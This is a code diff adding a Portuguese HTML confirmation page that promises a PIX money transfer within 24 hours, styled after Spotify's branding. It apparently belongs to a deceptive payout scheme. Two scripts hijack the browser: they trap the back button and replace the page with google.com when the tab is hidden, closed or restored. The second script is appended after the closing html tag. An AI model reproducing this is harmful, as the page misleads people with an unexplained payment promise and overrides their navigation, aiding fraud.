@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Parabéns! Solicitação Recebida</title>
+  <meta name="description" content="Parabéns! Sua solicitação de transferência foi recebida. A transferência via PIX será realizada em até 24h." />
+  <style>
+    :root{
+      --primary:#1db954; /* vibe Spotify */
+      --text:#0f172a;
+      --muted:#64748b;
+      --bg:#f2f7fb;
+      --card:#ffffff;
+      --ring: rgba(29,185,84,.18);
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; background:var(--bg);
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, "Noto Sans", "Helvetica Neue", sans-serif;
+      color:var(--text);
+    }
+    .wrap{
+      max-width:860px; margin:40px auto; padding:24px;
+    }
+    .card{
+      background:var(--card);
+      border-radius:14px;
+      box-shadow:0 18px 40px rgba(0,0,0,.06);
+      padding:28px;
+      text-align:center;
+      border:1px solid #e8edf3;
+      position:relative;
+    }
+    .logo{
+      width:180px; height:auto; display:block; margin:10px auto 16px;
+    }
+    .badge{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#eaf8ef; color:var(--primary);
+      padding:8px 12px; border-radius:999px; font-weight:700; font-size:14px;
+      margin-bottom:12px;
+    }
+    h1{margin:8px 0 10px; font-size:28px; line-height:1.1}
+    p.lead{color:var(--muted); font-size:16px; margin:0 auto 6px; max-width:640px}
+    .ring{
+      width:120px; height:120px; margin:14px auto 8px; border-radius:999px;
+      border:12px solid var(--ring); display:flex; align-items:center; justify-content:center;
+      font-size:44px;
+    }
+    .mini{
+      text-align:center; color:var(--muted); font-size:12px; margin-top:16px;
+    }
+    @media (max-width:520px){
+      .card{padding:22px}
+      .logo{width:150px}
+      h1{font-size:24px}
+      .ring{width:96px; height:96px; border-width:10px; font-size:36px}
+    }
+  </style>
+</head>
+<body>
+
+  <main class="wrap">
+    <section class="card">
+      <span class="badge">✅ Solicitação registrada</span>
+      <img class="logo" src="logo.png" alt="Logo">
+
+      <div class="ring">🎉</div>
+      <h1>Parabéns!</h1>
+      <p class="lead">
+        Recebemos sua solicitação de transferência. O valor será enviado via <b>PIX</b> para a
+        <b>chave cadastrada</b> em um prazo de <b>até 24h</b>.
+      </p>
+    </section>
+
+    <p class="mini">Caso tenha cadastrado a chave PIX incorretamente, entre em contato com o suporte imediatamente.</p>
+  </main>
+
+  <!-- Backredirect: se tentar voltar, redireciona para Google -->
+  <script>
+    (function(){
+      // Empurra um estado para a pilha de histórico
+      history.pushState(null, document.title, location.href);
+      window.addEventListener('popstate', function(){
+        location.replace('https://www.google.com');
+      });
+    })();
+  </script>
+</body>
+</html>
+
+
+<!-- BACKREDIRECT -->
+<script>
+(function () {
+  const BACK_URL = "https://www.google.com";
+  let armed = true;
+  let navigating = false;
+
+  // Desarma nos CTAs
+  document.addEventListener("click", function (e) {
+    const a = e.target.closest("a");
+    if (a && a.href) {
+      navigating = true;
+      armed = false;
+      setTimeout(() => { navigating = false; armed = true; }, 1500);
+    }
+  }, true);
+
+  // Trap do botão voltar
+  function trapHistory() {
+    try { history.pushState({}, "", location.href); } catch(e) {}
+  }
+  trapHistory();
+  setTimeout(trapHistory, 60);
+
+  window.addEventListener("popstate", function () {
+    if (armed) {
+      location.replace(BACK_URL);
+    } else {
+      setTimeout(trapHistory, 100);
+    }
+  });
+
+  // Fecha aba ou troca app (iOS/Android/PC)
+  window.addEventListener("pagehide", function () {
+    if (armed && !navigating) {
+      location.replace(BACK_URL);
+    }
+  });
+
+  // Aba em background
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden" && armed && !navigating) {
+      location.replace(BACK_URL);
+    }
+  });
+
+  // Volta de background (iOS específico)
+  window.addEventListener("pageshow", function (e) {
+    if (e.persisted && armed && !navigating) {
+      location.replace(BACK_URL);
+    }
+  });
+})();
+</script>
+
+</body>
+</html>
